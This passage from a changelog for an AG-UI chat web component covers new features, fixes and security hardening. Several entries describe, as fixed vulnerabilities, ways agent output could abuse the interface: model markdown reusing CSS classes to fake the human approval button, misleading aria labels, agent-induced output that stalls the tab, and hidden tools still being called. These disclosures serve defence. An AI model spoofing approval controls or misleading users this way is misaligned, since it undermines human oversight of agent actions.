  `ToolPayloadFormatter` and `ToolCallCardOptions` are exported for a host
  building cards itself.

- **`data-max-tool-rounds` — the tool-round budget is configurable.** The cap on
  frontend tool-call to re-run rounds within one send was the constant
  `MAX_TOOL_ROUNDS` (10) with one read and no way to change it. Ten suits a chat
  whose tools answer questions; a page-driving deployment reaches it
  legitimately — filling a form is one round per field — and the symptom is not
  an error but an answer that stops mid-task, which reads as the model giving
  up. `AgUiClientConfig.maxToolRounds` is the seam for a host driving the client
  directly. A value below one is ignored rather than honoured: it would not be a
  smaller budget but a send that never runs the agent at all, which would look
  exactly like a broken endpoint. Validation lives in the client, so the
  attribute and the config option cannot drift apart.

- **`data-message-actions` — the message action row has an opt-out.** The row
  shipped with `::part()` hooks and no off switch, and ran on every finished
  assistant bubble; a host embedding the component in a constrained surface had
  no way to suppress it. The attribute is a comma list of the actions to keep
  (`copy` / `retry` / `feedback`), and `="false"` — the spelling its sibling
  gesture `data-quote-selection` already uses — leaves none. Absent means all
  three, so the attribute only ever subtracts and a host that never sets it
  keeps exactly what it had.

  **Per-action rather than one switch**, because the three disappear for
  different reasons: the rating pair is only useful to a host listening for
  `ag-ui-feedback` and is two dead buttons otherwise, retry re-runs the agent
  which a constrained surface may forbid, and copy is the one nobody objects to.
  A single switch would have made dropping either of the first two cost the
  third — and a host wanting one gone would have rebuilt the row from
  `attachMessageActions`, reimplementing the part names, the accessible grouping
  and the retry hand-off in order to lose two buttons. With nothing left the row
  is not built at all: an empty one still takes its margin and still announces
  itself to a screen reader as a group of actions. `MESSAGE_ACTIONS` is exported
  as the token vocabulary.

### Changed

- **`MessageActionsOptions.text` is optional**, and its absence is what omits
  the copy button — the same idiom `onFeedback` already used, where what a
  button needs to do its job is also the statement that it belongs. Additive for
  existing callers.

### Documentation

- **The README's API reference now agrees with the source, and a test keeps it
  there.** `tests/readme_api_surface.test.ts` asserted only that every exported
  *name* appeared somewhere in the README, which is the weakest claim a document
  can make about a symbol: two of the wrong descriptions below were about
  symbols the README named correctly and then described wrongly, so they passed
  the gate as written. It now checks the claims the README actually makes,
  wherever those can be derived from the source cheaply — the completeness of
  the attribute, method and property lists; the live / connect-time split
  against `observedAttributes` itself; the members of a documented object shape
  against the interface that declares them; the parameter count of a documented
  call or arrow type; that every `chat.x` the README writes names a real member;
  and the markdown mechanics that make a claim readable at all — a link
  resolving to a heading, a table row not split by a bare `|`, a run of rows not
  orphaned from its header. The file states its own boundary in a comment: it reads structure and
  never semantics, so return types, parameter types, prose and inherited
  interface members are deliberately outside it. Reimplementing a TypeScript
  parser here would cost more than the drift it caught.

- **`title-text` was documented as "the only observed attribute".** It is one of
  eighteen, and the fourteen it did not mention are exactly the ones whose whole
  purpose is to warn a framework host that a late attribute write is inert — so
  the sentence told a reader that the machinery built for their case does not
  exist. A new *When each attribute is read* subsection splits the observed set
  into the four that are live and the fourteen that are connect-time, says what
  a late write to each does, and names the one attribute
  (`data-launcher-icon-url`) that is read while connecting but is not observed,
  so a late write to that one is inert *and* silent.

- **`UploadHandler` was documented without the `signal` that prevents a leak.**
  The type takes a third `signal?: AbortSignal`, fired when the tray removes a
  chip or the element is torn down. A tus or direct-to-S3 adapter written from
  the two-parameter signature orphans a server-side file on every removed chip,
  which is a storage bill rather than a visible bug. `UploadOptions` and
  `TranscribeOptions` were each missing `credentials` for the same reason
  nothing noticed: an omitted option reads as an option that does not exist.

- **Other corrections found by the same sweep.** `parseToolCatalog` was still
  documented with its pre-0.28.0 name-to-summary return, though it returns
  `Record<string, ToolCatalogEntry>`; `QuestionRenderer` pointed at
  `AgUiChat.questionRenderer`, which has never existed (the property is
  `askUserRenderer`); `ConfirmationOptions`, `ApprovalOptions` and
  `ApprovalRequest` each omitted a member; `quotableSelection` was documented
  with two of its three parameters; the `TOOL_DISPLAY` constants row omitted
  `inline` though the attribute row had it; the Methods list was eight short and
  the Properties list nine, including the deprecated `registerStateHook` and the
  `closeCheckpoints` / `toggleCheckpoints` pair; two rows hid an unescaped `|`
  inside a code span, which splits the row wherever the README is rendered; a
  paragraph with a code block sat in the middle of the attribute table, breaking
  it into two tables and orphaning the seven rows below it; and two links
  pointed at an `#events` section that has never existed.

## [0.29.0] — 2026-08-29

### Added

- **Quote a selection into the composer.** Selecting text in the transcript now
  floats a **Quote** offer beside it; taking it drops the selection in as a
  markdown blockquote and leaves the caret on a fresh line under it. Nothing is
  sent -- a quotation is how a question narrows to one part of an answer, so the
  question still has to be written. Quoting appends, so a second quotation is a
  second thing being asked about. Long selections cap at 500 characters.
  `data-quote-selection="false"` turns the offer off; the `quote-selection`
  `::part()` styles it.

  **The half worth having is the one the transcript cannot reach.** A chat
  mounted beside a table, a diff or a report sits in the surface the user
  actually works in, and a selection made *there* is one no hosted chat can see.
  `offerQuoteInPage()` extends the same select-then-offer gesture to the host's
  own page, or to one region of it, and `quote(text)` is the seam underneath for
  a deliberate trigger like a per-row "ask about this" button.

  **The page half is a method rather than a documented recipe, and that is the
  correction, not the design.** It shipped first as four lines in the README --
  quote every settled selection -- which appends to the composer on every drag
  the user made to *read*, to copy, or to fix a typo. Worse, it cannot tell a
  selection in the page's prose from one inside the user's own half-typed
  `<input>`: Chrome reports a field's internal selection through
  `document.getSelection()` as an ordinary range over the field's **wrapper**,
  so the text reads back perfectly and nothing about the range says where it
  came from. The only signal is `document.activeElement`. That guard, plus
  skipping the widget's own transcript -- which needs the *event path*, since
  `Node.contains` is false across a shadow boundary -- plus retiring a
  fixed-position affordance on scroll, is three non-obvious guards, and three
  guards is a feature rather than a snippet. `attachQuoteOffer` is exported for
  a host that wants it without the element.

  **A selection across several elements is not a paragraph, and was treated as
  one twice over.** The offer was hung off the selection's *bounding box*, whose
  centre belongs to no line -- a drag from a form's left column down to a
  full-width line running under the chat panel put the offer on the panel,
  pointing at a line the user had never looked at. It now hangs off the line the
  gesture ended on, or the first line for a keyboard selection. And the text was
  read with `Range.toString()`, which concatenates text nodes and asks nothing
  about CSS: quoting a form returned the values of every `<option>` in a closed
  `<select>`, the markup's own indentation on every line, and a blank `>` for
  every gap between elements -- twenty-four lines of which twelve were empty.
  The read is now what the engine says is rendered (`checkVisibility`), with the
  whitespace a collapsing `white-space` collapses, and preformatted text passed
  through so a quoted code block keeps its shape. Four leading spaces inside a
  blockquote is a markdown code block, so this was a rendering defect and not
  only an untidy one.

  Reading a selection out of a shadow tree is the part that takes care, and the
  component now does it properly: engines disagree about what
  `document.getSelection()` reports for a selection made inside a shadow root,
  and `getComposedRanges` is used where the engine has it, with the direct read
  behind it. `quotableSelection`, `asQuote` and `MAX_QUOTE_CHARS` are exported
  for a host with the same problem in its own component.

- **`approveWithEdits` — edit a gated call's arguments before approving it.**
  AG-UI's resume payload carries `editedArgs` and the protocol gates it on the
  agent's `approveWithEdits` capability; the approval card could not offer it.
  It now shows the call's arguments as editable JSON.

  **Off by default, and an assertion about the server rather than a
  negotiation.** Capabilities are not on the wire this component reads, so it
  cannot check — and turned on against a server that ignores `editedArgs`, a
  user would edit arguments it silently discards, which is worse than not
  offering.

  `editedArgs` rides the payload **only when something actually changed**, so a
  server can tell "approved as proposed" from "approved, but like this" without
  diffing what it sent. Unparseable JSON, or JSON that is not an object, keeps
  the card open with the reason on it rather than approving the original behind
  the user's back. Offered only for an interrupt naming a call this component
  holds a card for, since the card is where the arguments still are.

  New `::part()`s `approval-edit`, `approval-args`, `approval-error`, and three
  strings.

- **`formatRelativeTime` — replace the drawer and checkpoint timestamps.** There
  is no `Intl` anywhere in this component, and the locale-neutral `"5m ago"` is
  deliberate: guessing a locale would disagree with the host page, and being
  wrong in a second language is worse than being neutral in one. That is a good
  default and a bad requirement, and a host previously could not even reach the
  formatter to replace it.

  `relativeTime` and the `RelativeTimeFormatter` type are now exported, and the
  formatter is read at render rather than at connect, so setting it after mount
  works.


- **Server-pushed follow-up suggestions.** A `suggestions` activity draws its
  prompts as chips; clicking one sends it as the user's message. Registered
  skill chips are static and host-configured, so they can say "summarize this"
  but never "want me to update the shipping address too?" after a tool has run.

  Rides the activity envelope charts already use rather than a `CUSTOM` event,
  which buys persistence for nothing: chips are content, so a reload puts them
  back, and a set pushed under an id already on screen replaces that row.

  Bounded at 4 prompts of 120 characters, mirroring django-ag-ui's
  `suggestions_activity()`. The producer *raises* past those bounds while this
  side silently drops — deliberate asymmetry, because the producer can report
  the problem and the client cannot. Both numbers live on both sides for the
  reason the chart bounds do: mirroring only some of them leaves exactly the
  silent-drop hole they exist to close.

  New `::part()`s `suggestions` / `suggestion-chip`, new
  `SUGGESTIONS_ACTIVITY_TYPE`, and `renderSuggestionChips` / `suggestionPrompts`
  exported for a host drawing its own.


- **A message action row — copy, retry, thumbs up/down — under every finished
  assistant message.** There were **zero** message-level actions before this;
  `attachCopyButtons` handled fenced code and nothing else.

  **Retry is the item that earns it.** History truncates to the most recent user
  message inclusive and the run repeats, so the agent answers the question it was
  asked rather than being told its last answer was wrong. It sits on the **last**
  answer only: re-running an older turn is branching, and for a page-driving
  agent editing a past turn is not neutral, because those turns clicked buttons.
  `retryLastTurn()` is public for a host driving its own message UI.

  A retried turn **re-runs its tools**, which the previous attempt already ran.
  Confirmation still applies, so a destructive tool asks again unless the user
  waived it this session.

  Ratings fire `ag-ui-feedback` and **store nothing**: a rating belongs to
  whatever the host already uses for product signal, and a write-only table
  inside a chat widget is a schema nobody reads.

  New `::part()`s `message-actions` / `message-action` (plus
  `message-action-retry`, `-copy`, `-up`, `-down`), new `FEEDBACK_EVENT` and
  `FeedbackDetail`, and `attachMessageActions` / `messageActionBar` exported for
  a host assembling its own transcript.

- **A dropped run has a way back.** `ConnectionLostError` rendered a dead
  "Connection lost" bubble; only *uploads* had retry. The failed bubble now
  carries the same action row, with Retry and Copy and no rating — error text is
  what people paste into a bug report, while "the connection dropped" is not a
  statement about answer quality and mixing it into feedback makes that signal
  say less.

  **Kept as an error rather than demoted to a run notice**, which is what was
  originally proposed. `renderRunNotice`'s contract is that a notice "never
  settles, takes no action, and carries no controls" and is "distinct from an
  error, which is a failure". This is a failure that now needs a control, so the
  taxonomy already had the answer.


- **"Always allow" on the confirmation card — a session-scoped waiver, per tool
  name.** Confirmation was binary and permanent: `autoConfirm` is
  all-or-nothing and `confirmPredicate` has no memory, so a tool the user
  approves every single time keeps asking every single time.

  A prompt approved nearly every time is not a decision, it is a speed bump, and
  the reflex it trains is what makes the rare refusal easy to miss. Anthropic
  published that users approve **~93%** of Claude Code permission prompts
  manually and called interactive confirmation *"behaviorally unreliable as a
  sole safety mechanism"* on exactly that basis. The waiver exists so the
  prompts that remain still mean something.

  **The button appears only where the `x-destructive` default is what gated the
  call.** `confirmPredicate` is documented as authoritative, so letting one
  click retire it would silently defeat a host policy — and because the offer
  and the allowlist sit on the same path, there is no dead button either. The
  waiver is per tool name and per element, held in memory and never persisted: a
  session decision that outlived the tab would be a permanent grant made by one
  click, which is what `autoConfirm` already exists to say deliberately.

  New `::part()` `confirm-always`, new string `confirmAlways`, and
  `requestConfirmation` gains an `onAlwaysAllow` option — its presence is what
  renders the button, so the affordance can never appear with nothing listening.
  The card still resolves `true`: the waiver is *in addition to* approving this
  call, not instead of it.


- **`ag-ui-invalidate` and `RunFinishedDetail.invalidated` — the agent tells your
  page what it moved.** The agent writes and the page still shows the old list.
  `ag-ui-run-finished` already said *something* moved, so this is **precision on
  a channel that ships**: the server names the resources and a host refetches
  only those.

  ```js
  chat.addEventListener("ag-ui-invalidate", (e) => {
    if (formIsDirty()) return showBanner("This data changed.", e.detail.keys);
    refetch(e.detail.keys);
  });
  ```

  **Do not reload on this.** The user was probably typing, and an
  agent-triggered reload into a live form destroys unsaved input with no
  explanation the user can see. The component never reloads by itself and offers
  no option that would.

  **Two dispatches, deliberately.** The live event fires as each announcement
  arrives, which is what makes a long multi-step run feel live -- the list
  refreshes as the third of eight writes lands. `invalidated` on the existing
  run-finished detail carries the same keys de-duplicated at the end, so a host
  already listening there upgrades by reading one extra field:

  ```js
  if (detail.invalidated.length > 0) refetchOnly(detail.invalidated);
  else if (detail.tools.some((t) => t.side === "server")) refetchEverything();
  ```

  That `else` is the whole compatibility story. A new server with an old client
  has its `CUSTOM` event ignored and still gets the coarse refetch; an old server
  with a new client leaves `invalidated` empty and falls through to the same
  branch. Nothing negotiates, which is what makes this shippable across repos
  with independent release cadences.

  **Keys are opaque and matching is exact.** `orders/42` does not imply `orders`
  -- a prefix rule would be this component guessing at a scheme it does not own,
  and `orders/1` would match `orders/11`. A server that wants the collection
  refreshed names it. Hosts may match hierarchically in their own vocabulary,
  where the scheme is known.

  Built on the `CUSTOM` carrier rather than `ACTIVITY_SNAPSHOT`, because an
  invalidation is an imperative: activities are materialised into messages,
  persisted and replayed on every thread restore, and an invalidation replayed on
  every thread load is a refetch storm. Nothing is rendered or persisted, and
  that absence is asserted. Every other `CUSTOM` name still arrives on
  `ag-ui-custom` unchanged, and an invalidation does **not** also fire it -- a
  host listening to both would otherwise refetch twice for one announcement.

  Requires django-ag-ui 0.51 to have anything to receive.

- **`registerActivityRenderer` — `activityType` is an open set now, not two
  branches.** AG-UI leaves exactly two payload names an open string the protocol
  does not enumerate, and the component treated neither as open: `chart` and
  `compaction` were handled and everything else fell through a bare `return`,
  with no host seam and no record that anything had arrived. The server could
  only say things the client had been compiled to understand, in a protocol
  designed so it can say more.

  ```js
  chat.registerActivityRenderer({
    type: "build_status",
    render: (content) => {
      const el = document.createElement("div");
      el.textContent = `Build ${content.status}`;
      return el;
    },
  });
  ```

  `render` carries the same contract as a client tool's `render`, and for the
  same reason rather than by analogy: activities are materialised into
  `role: "activity"` messages, persisted with the transcript and re-fired on
  restore, so a renderer that writes to the page instead of returning DOM fires
  again on every thread load.

  **Both built-ins go through the registry**, which is the test that the seam is
  real — a built-in needing a privileged branch would mean the seam cannot
  express what the component itself needs. Registering either name replaces it.

  Compaction gains two things by going through the seam: a reload puts the
  notice back (it is content, and content replays), and a server redrawing under
  the same `messageId` replaces it instead of leaving two notices standing for
  one event.

- **`unhandledActivityTypes`** — the activity types that arrived with nobody
  registered to draw them. Deliberately the only trace: ignoring an unknown name
  is the protocol's own answer, and a warning would fire on every
  forward-compatible server, but "nothing happened and nothing was said" is
  impossible to debug. Note `chart` is listed until `enableCharts(["activity"])`
  is called, which is the honest answer to "I pushed a chart and nothing
  happened".

- **`ag-ui-custom`** (`CUSTOM_AGENT_EVENT`, detail `CustomAgentDetail`) — the
  other open carrier, which had no implementation at all. An AG-UI `CUSTOM`
  event is forwarded to the host page whole and uninterpreted, `bubbles` and
  `composed` like every other event the element dispatches.

  **It is deliberately not rendered, persisted or replayed.** That asymmetry is
  the rule for choosing between the two carriers: `ACTIVITY_SNAPSHOT` is content
  and has a place in the conversation, `CUSTOM` is an imperative with no meaning
  once acted on, and replaying "refetch the board" on every thread load would be
  a bug rather than a feature.

  **Note:** pydantic-ai emits its own compaction activity under
  `pydantic_ai_compaction`, by a different route than the harness sink this
  package renders as `compaction`. The registry deliberately does **not** answer
  to both names — doing so would give a deployment running both two notices for
  one event. It shows up in `unhandledActivityTypes` instead, so a host that
  wants it can register it and decide about duplication itself.

### Fixed

- **The message action row sat closer to the block below it than to the message
  it acts on.** The answer group is a flex column with a 10px gap, so the row's
  `margin-top: 6px` **added** to that gap instead of tightening it: 16px above,
  10px below, and the buttons read as belonging to whatever card followed. A
  negative margin pulls the row back inside the gap — 4px above, 10px below.

  Found by driving the demo, not by any assertion: every existing check was
  satisfied by the broken spacing. Ordered correctly, contained correctly,
  visible — and grouped with the wrong thing. The new browser case fails against
  the previous stylesheet with `expected 16 to be less than 10`.


- **The action row is a sibling of the message bubble, not a child.** Inside, the
  buttons join the bubble's `textContent` — which is what Copy reads, what
  history persists, and what every existing assertion about a message's text
  compares against. An answer would have been copied back carrying the glyphs of
  the buttons that copied it. Caught by twelve existing tests failing at once,
  which is the check working.


- **The confirmation card's action row could push a button outside the card.**
  It was a `justify-content: flex-end` flex line with no wrap, built when there
  were two buttons. Measured in Chromium at a 260px panel: the three buttons want
  71 + 107 + 81 plus two 8px gaps against a 200px row, and the overflow went off
  the **left** edge — Cancel rendered, styled and reporting its label, 27px
  outside the box the user can see and hit.

  `flex-wrap: wrap` lets the row take a second line instead, as the checkpoint
  row already does. Found by measuring rather than by review: happy-dom lays out
  no boxes and answers 0 for every width, so it called the overflowing row and
  the fitting one the same pass. The new browser test fails against the previous
  stylesheet at that width and passes at the two wider ones, which is the honest
  shape of the bug.


- **A server that replaced the conversation did it in silence.** AG-UI's
  `MESSAGES_SNAPSHOT` is applied by `@ag-ui/client` before any subscriber runs,
  so `agent.messages` **is** the server's list by the time the host sees
  anything — and the run loop persists `agent.messages`. The replacement
  therefore reached the conversation store either way, while the DOM was
  untouched. Nothing looked wrong until a reload, in a later session, served a
  transcript the user had never seen, with no event that could be correlated to
  it. That is not reported as a bug; it is reported as "the chat lost my
  messages".

  The store still follows the server, deliberately — the server is authoritative
  about what the conversation *is*, and it would follow it regardless. What
  changes is that the replacement is now announced in the transcript.

  **Re-rendering from the snapshot was the other candidate and is declined.** A
  snapshot can land mid-run, and rebuilding the transcript then destroys the
  in-flight run's own state: the streaming bubble, the open answer group, and
  every tool card keyed by call id, some still waiting on results. This is the
  same answer the same question already got for compaction.

- **One string-valued point silently dropped a whole chart that was on screen.**
  `chartSpecFrom` returns `null` for the entire spec when any point is not a
  finite number — not the offending series, the whole chart — and the pushed
  activity path then removed any chart already rendered and returned, with no
  `console` call anywhere on that path. The triggering shape is not exotic: a
  Django `Sum` over a `DecimalField` serialises as a JSON string, and money is
  the most common chart input there is.

  **Removing it is still right** and is unchanged: leaving retracted numbers on
  screen reading as current is worse, and a reload drops the chart anyway
  because the *stored* content is the version that could not be drawn. Live and
  reload should agree. What was wrong was doing it silently. The path now warns
  on the console naming the likely cause, and posts a notice in the transcript
  when a chart that had been drawn is taken away.

  Nothing is coerced, client-side or server-side. `django-ag-ui` already raises
  at construction and names `Decimal` on purpose, and guessing whether
  `"1234.50"` lost precision upstream is not a favour worth doing.


- **A screen reader re-announced the whole answer tens of times per turn.** The
  transcript carried both `role="log"` and an explicit `aria-live="polite"`,
  and the streaming bubble's `innerHTML` is replaced inside it on every
  animation frame. `role="log"` already implies polite announcement and the
  default `aria-relevant` includes text additions, so every frame was a fresh
  announcement of the answer so far. That is not merely unhelpful; it is
  hostile.

  The transcript is demoted out of live-region duty with an explicit
  `aria-live="off"`, which overrides the value the role implies. **The role
  stays** -- the log semantics are what let the transcript be navigated as one,
  and only the announcing was the defect.

  A separate visually-hidden status region takes over, and roughly four short
  statuses land per turn: responding, answered, a decision is waiting and how
  many, stopped, failed. Five new `strings` keys (`announceResponding`,
  `announceAnswerReady`, `announceAwaitingDecision`, `announceStopped`,
  `announceFailed`) make all of them translatable. The answer's own words never
  reach it, and neither does an exception's.

- **The transcript could not be read while anything streamed.** Eleven separate
  sites assigned `scrollTop = scrollHeight` unconditionally, and nothing in the
  element listened for a `scroll` event -- so nothing knew the reader had
  scrolled up, and scrolling back during a run was undone by the next token.

  All eleven now follow the foot only while the reader is already there. A
  **jump-to-latest** button (`jump-latest` part, `jumpToLatest` string) appears
  once they have scrolled away *and* have since missed something; scrolling up
  through a settled transcript is not a reason to nag. A user's own message
  still goes to the foot -- pressing Send is as deliberate as pressing the
  button. `overflow-anchor: none` stops the browser's own scroll anchoring
  competing for the same job.

- **A strict-CSP host got an unstyled widget.** The stylesheet was injected as
  an inline `<style>`, which a host with a strict `style-src` and no
  `'unsafe-inline'` drops silently: the component mounted, functioned, and
  rendered with no styling at all, and nothing in the console pointed at why.
  It is attached with `adoptedStyleSheets` instead, which carries no
  inline-style origin.

  The sheet is per instance rather than shared at module scope. A shared one
  would also stop re-parsing the stylesheet once per mount, but a module-level
  singleton is what this package forbids, and per instance is no worse than the
  `<style>` it replaces.

  All three came out of a **survey of how other products build chat**, not a
  review. Two review passes and a full audit wave went over this component
  without surfacing any of them, because each is invisible unless you ask how
  everyone else does it.

## [0.28.0] — 2026-08-26

### Added

- **A conversation could carry from one signed-in user to the next in the same
  tab.** New `user-key` attribute (and matching `userKey` property): set it to
  whatever identifies the signed-in principal, and the stored conversation is
  scoped to them, so two principals in one tab cannot reach each other's
  transcript. Changing it — or clearing it — purges everything the previous
  principal left behind under this element: the transcript, the history drawer
  index and any navigation checkpoint. That purge is why it is a live attribute
  rather than a connect-time one: `sessionStorage` is scoped to the tab and not
  to the session, so it survives the navigation a logout is, and a single-page
  app signs out through its own router without remounting anything — the host
  naming the new principal is the only signal there is. The first value to
  arrive is treated as a host naming the user who was already there rather than
  as a handover, so an element configured by an async auth handshake keeps the
  conversation on screen. Absent, behaviour is exactly what it was, including
  that carry-over; the README says so where the attribute is documented.
  `SessionStorageStore.purge(namespace)` exposes the same primitive for a host
  driving its own sign-out.

- **Pointing history at a server still left a full copy of every transcript in
  the browser.** `RemoteConversationStore` mirrored each message body into
  `sessionStorage` whatever the deployment had chosen, so an operator who
  configured `data-threads-url` precisely to keep conversations in the database
  got them in both places. The mirror is now a `cacheMessages` constructor
  option, exposed on the element as `data-threads-cache="false"`, and it still
  defaults to the caching behaviour so nobody's setup changes silently. Turning
  it off keeps only the client-only state — the active thread id and the
  navigation checkpoint — so reloads and navigating tools work as before; what
  it costs is the offline fallback, since there is no longer a local copy to
  fall back to.

- **`UiStrings.recordingLimit`** — what the mic button says after a recording
  stopped itself at the length cap. Token: `{n}`, the cap in minutes. Like every
  other key it has an English default, so an existing `strings` override keeps
  working untouched.

- **`trustedOrigins` on the agent factory options** — the origins, besides the
  document's own, the agent may carry host credentials to. Naming one confirms
  the destination was chosen deliberately and silences the notice above for it.
  Compared as serialized origins (`https://agent.example.com`), scheme and port
  included. Reachable through a custom `agentFactory`, which is how a host wraps
  `createHttpAgent` today.

- **`trustedOrigins` on the element** — the origins, besides the page's own, that
  every one of its seven configurable URLs may carry host credentials to without
  a console notice. Forwarded to the agent factory as well, so a host that does
  not override `agentFactory` configures all seven in one place.

### Changed

- **`parseToolCatalog` returns whole catalog entries, not bare summaries.** Its
  return type was `Record<string, string>`, so the `description` field that
  `ToolCatalogEntry` declares and documents was dropped at parse time for every
  entry — a documented wire field no consumer could reach, and none could be
  added without changing this signature first. It now returns
  `Record<string, ToolCatalogEntry>`. Tool-call cards still label themselves from
  `summary`; callers of the exported parser get the entry the server actually
  sent. A malformed `description` costs that field, not the entry, matching the
  tolerance the rest of the parse already had.

### Fixed

- **A reasoning block lost its last sentence, and a short one never appeared at
  all.** The protocol client hands a delta subscriber the text accumulated
  *before* the delta it is announcing, so following that callback alone trails
  the stream by one and renders nothing whatsoever for reasoning that arrives as
  a single delta. The answer text was spared because its own end event carries
  the whole message; reasoning subscribed to an end event that carries no buffer.
  It now also listens to the one that does. The test helper was the reason this
  went unseen: it handed the subscriber the full buffer on every delta, a wire no
  server writes, so every existing test agreed with the bug.

- **Two chats on one page shared one conversation.** The storage namespace falls
  back from the element's `id` to its `endpoint`, so two `<ag-ui-chat>` elements
  with no `id` against the same agent mount — a docked support panel and an
  inline page assistant, say, and nothing requires an `id` — resolved to the same
  namespace and shared a thread pointer, a history drawer and every message key.
  Whichever mounted second adopted the first's active thread and rehydrated its
  transcript into its own panel. The first element to mount now keeps the
  namespace, so the ordinary single-element case is untouched, and a second is
  given a throwaway namespace of its own plus a console warning naming the fix.
  The throwaway namespace is minted per mount, so give each element an `id` for
  its conversation to survive a reload.

- **A full storage quota was reported as an agent failure.** `sessionStorage`
  writes throw once the quota is exhausted — a long conversation, or one turn
  carrying a large tool result — and in privacy modes that deny storage
  outright. The transcript is persisted from inside the run loop, so that throw
  surfaced as a run error and told the user the agent had failed when nothing
  but the browser's storage had; on the cancel path it escaped as an unhandled
  rejection instead. A write that cannot be made now costs the reload and not
  the conversation, and says so in the console once rather than once per turn.

- **A tool a page deliberately withheld from a run still ran when the agent
  called it.** `getTools` is a per-run catalog provider, so a host is invited to
  scope what a given page offers while registering everything once at mount.
  Dispatch never consulted it: it resolved the call name straight against the
  mount-wide registry, so a call naming a scoped-out tool found its handler and
  ran it — with the confirmation card the only remaining gate, and that card is
  waived by `autoConfirm`, by a `confirmPredicate`, or by a schema without
  `x-destructive`. The page's decision not to offer the tool carried no weight
  where it mattered. The names a run advertises are now captured as the catalog
  goes out, and a call outside that set is treated exactly as a call naming a
  tool that was never registered. The set is the snapshot, not a fresh
  `getTools()` at dispatch time — asking the provider again would re-open the
  window it exists to close. Hosts that never override `getTools` advertise the
  built-ins plus everything registered, which is exactly what dispatch could
  reach before, so nothing changes for them.

- **A long streamed answer slowed the tab down as it arrived, and destroyed any
  text selected inside it on every token.** Each `TEXT_MESSAGE_CONTENT` event
  carries the whole answer so far, and every one of them re-parsed the markdown,
  re-sanitised it and replaced the bubble's entire subtree. Cost grew with the
  square of the answer's length — a 40 KB answer streamed token by token meant
  thousands of full parses over a document that kept getting longer — and
  because the subtree was rebuilt each time, a selection or a focus inside the
  bubble could not survive a single token. Since a long answer is entirely
  agent-controlled, an agent induced to produce one turned an ordinary run into
  a stalling tab. Deltas now coalesce into one render per animation frame: a
  burst of tokens costs one parse, and a frame is the fastest anything on screen
  can change anyway, so the text still flows rather than arriving in chunks. The
  bubble opens on the first token as before, keeps its identity throughout, and
  a run that ends without closing its text message — a cancel, an error, a round
  boundary — draws the queued delta before letting the bubble go, so a stopped
  answer keeps its last words.

- **Model output could draw a pixel-accurate copy of the approval card.** The
  markdown sanitiser kept `class` on every element it allowed, and the shadow
  stylesheet's component classes are unscoped selectors, so a
  `<span class="approval-btn approval-btn--approve">` in an assistant message
  resolved to the same background, border and radius as the genuine
  human-in-the-loop approve button — rendered as ordinary prose, inside the one
  surface where the user decides whether to approve something. The same trick
  reproduced the question card, the tool-call card and a turn the user never
  took. `class` was on the allowlist for exactly one thing, `marked`'s
  `language-*` code-fence hint, and is now narrowed to it: a `language-*` token
  on a `code` or `pre` element survives, and every other class is dropped.
  Highlighting a fenced code block is unaffected.

- **The sanitiser allowed far more attributes than the three it declared.**
  DOMPurify's `ALLOW_DATA_ATTR` and `ALLOW_ARIA_ATTR` default to `true`, so every
  `data-*` and `aria-*` attribute passed through alongside `href`/`title`/`class`
  while the configuration read as though only those three could survive. That
  handed model output the attributes the cards drive their resolved, status and
  expanded appearance from, and let an `aria-label` make a screen reader announce
  something other than what a sighted user reads. Both are now off, so the
  declared allowlist is the effective one.

- **Rendered markdown was edited after the sanitiser had finished with it.** The
  sanitised string was parsed into a `<template>`, given its `target`/`rel` link
  hardening there, and re-serialised — so the markup actually inserted into a
  bubble was never markup DOMPurify inspected, and it carried two attributes the
  allowlist did not name. Nothing exploitable came of it, because no allowed
  element serialises asymmetrically, but that held by accident rather than by
  design: adding `svg`, `style` or `noscript` to the allowlist would have turned
  the round trip into a bypass, and the suite asserted on the sanitiser's output
  instead of on what was inserted. Link hardening now runs inside the sanitiser,
  so what a caller inserts is exactly what DOMPurify approved, and a test holds
  it there.

- **Resizing the panel from the keyboard called `commit` on every key repeat.**
  It is documented as one call per completed resize and the pointer path honours
  that, but the keyboard path called it straight from each `keydown`. Holding an
  arrow key means OS key repeat at twenty to thirty events a second, so a host
  that put a `sessionStorage` write or a `PATCH` behind `commit` got that many
  for a single press — landing hardest on the keyboard users the path exists for.
  Live feedback still happens per key event; the commit now waits for the key to
  come up, or for focus to leave the grip mid-press.

- **A voice recording ran until somebody stopped it.** Tapping the mic and then
  being interrupted left `MediaRecorder` running with no upper bound: audio
  accumulated in memory, the browser's recording indicator stayed lit in a tab
  nobody was looking at, and whenever the user came back the whole accumulated
  clip was posted to the transcription endpoint in one body no client-side check
  sized. A recording now stops itself after two minutes — far longer than a
  dictated chat message, short enough to bound a forgotten one. The audio is kept
  and transcribed rather than discarded, and the mic button says why it stopped.

- **The README's "Public API surface" tables were missing a third of the surface
  they enumerate.** The section presents itself as complete, so a consumer who
  went looking for the chart-drawing seam, the approval and question card
  helpers, the transcription defaults, `prettifyToolName`, `parseToolCatalog` or
  two of the event-name constants found no mention and concluded the package had
  none. Thirty-two absent exports are now listed, and a test compares the tables
  against the package root's export list so the next new export cannot go missing
  quietly.

- **`UiStrings.checkpoints` had no documentation to hover.** An insertion of the
  copy-button strings landed between the checkpoint panel's doc comment and the
  field it described, stranding the comment above `copyCode`. It is back on
  `checkpoints`, and the copy-button and checkpoint fields now have sections of
  their own rather than splitting the relative-time group in half.

### Security

- **Host credentials no longer leave the page's origin silently.** `endpoint` and
  its sibling URL attributes are plain HTML, so a page that builds one from a
  query parameter or from tenant-authored configuration has handed whoever wrote
  that value the destination of the element's requests. The browser preflights
  the custom header, any server willing to answer receives it, and the CSRF token
  or bearer the host supplies through `headers` / `getHeaders()` leaves on the
  very first request — before the user has done anything. Nothing in the package
  compared a configured URL against an expected origin, so the delivery was
  invisible. The agent now reports it on the console, naming the destination and
  the header names, once per origin.

  It reports rather than refuses: an agent on another subdomain is a documented
  deployment and keeps working unchanged. What is removed is the silence.

  All seven configurable URLs are covered, not the agent endpoint alone. The tool
  catalog, the skills list, the thread index, the attachment upload and the
  transcription endpoint are named by the same kind of host attribute and carry
  the same headers, so reporting only the agent would have reported the least
  interesting of the seven.

### Documentation

- **Registering a duplicate tool name does not throw.** The README said it did.
  `ClientToolRegistry.register` is a plain map write, deliberately, so a re-fired
  host ref or React StrictMode's double-invoke replaces rather than raises. The
  harm in the claim is not the defensive guard nobody needs; it is a host
  believing two tools cannot quietly share a name, where the second wins.

- **`x-destructive` gates frontend tools only, and the docs claimed otherwise.**
  `isDestructive` described the flag as one the server stamps, which cannot
  reach it: tool schemas travel client-to-server on `RunAgentInput.tools`, and
  the only channel coming back is the label catalog, which carries names and
  summaries and no flags. Marking a server-side tool destructive therefore
